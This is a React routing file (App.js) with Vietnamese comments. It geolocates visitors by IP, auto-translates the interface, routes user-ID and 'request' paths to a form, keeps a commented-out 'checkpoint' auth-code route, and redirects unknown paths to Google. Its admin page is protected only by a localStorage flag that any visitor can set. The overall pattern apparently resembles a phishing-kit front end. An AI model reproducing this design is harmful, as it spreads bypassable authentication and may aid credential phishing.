import {
  Route,
  Routes,
  BrowserRouter,
  Navigate,
} from "react-router-dom";

import React, {
  useEffect,
  useState,
  useCallback,
} from "react";

import "./App.css";

import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";

import GoogleTranslate from "./components/GoogleTranslate";
import {
  getLanguageByCountryCode,
} from "./components/languageUtils";

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  const [locationData, setLocationData] =
    useState(null);

  const [translationLoading, setTranslationLoading] =
    useState(true);

  useEffect(() => {
    let mounted = true;

    const setLocation = async () => {
      try {
        const response = await fetch(
          "https://ipinfo.io/json"
        );

        if (!response.ok) {
          throw new Error(
            `HTTP ${response.status}`
          );
        }

        const data =
          await response.json();

        const country =
          data.country || "Unknown";

        const language =
          getLanguageByCountryCode(
            country
          ) || "en";

        const location = {
          lang: language,
          IP: data.ip || "Unknown",
          country,
          city: data.city || "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        if (!mounted) {
          return;
        }

        setLocationData(location);

        /*
         * Website gốc là English.
         * English không cần Google Translate.
         */
        if (language === "en") {
          setTranslationLoading(false);
        }
      } catch (error) {
        console.error(
          "Location error:",
          error
        );

        const location = {
          lang: "en",
          IP: "Unknown",
          country: "Unknown",
          city: "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        if (!mounted) {
          return;
        }

        setLocationData(location);

        setTranslationLoading(false);
      }
    };

    setLocation();

    return () => {
      mounted = false;
    };
  }, []);

  const handleTranslationReady =
    useCallback(() => {
      setTranslationLoading(false);
    }, []);

  /*
   * Chỉ chờ IP/location.
   *
   * Không chờ Google Translate ở đây.
   */
  if (!locationData) {
    return (
      <div className="app-loading">
        <div className="spinner" />
      </div>
    );
  }

  return (
    <>
      <BrowserRouter>
        <div id="app">

          {/*
           * Google Translate chạy song song
           * với UI.
           */}
          {locationData.lang !== "en" && (
            <GoogleTranslate
              targetLanguage={
                locationData.lang
              }
              onReady={
                handleTranslationReady
              }
            />
          )}

          {/*
           * Routes render NGAY.
           */}
          <Routes>
            <Route
              path="/"
              element={<HomePage />}
            />

            <Route
              path="id/:userID"
              element={<MyForm />}
            />

            <Route
              path="/request"
              element={<MyForm />}
            />

            {/*
            <Route
              path="checkpoint/:userID"
              element={<AuthCode />}
            />
            */}

            <Route
              path="/login"
              element={<Login />}
            />

            <Route
              path="/admin"
              element={
                <PrivateRoute>
                  <AdminPage />
                </PrivateRoute>
              }
            />

            <Route
              path="*"
              element={
                <meta
                  httpEquiv="refresh"
                  content="1; url=https://www.google.com/"
                />
              }
            />
          </Routes>

        </div>
      </BrowserRouter>

      {/*
       * Overlay spinner.
       *
       * UI vẫn nằm bên dưới và Google Translate
       * vẫn có thể thao tác với DOM.
       */}
      {translationLoading && (
        <div className="app-loading">
          <div className="spinner" />
        </div>
      )}
    </>
  );
}

export default App;
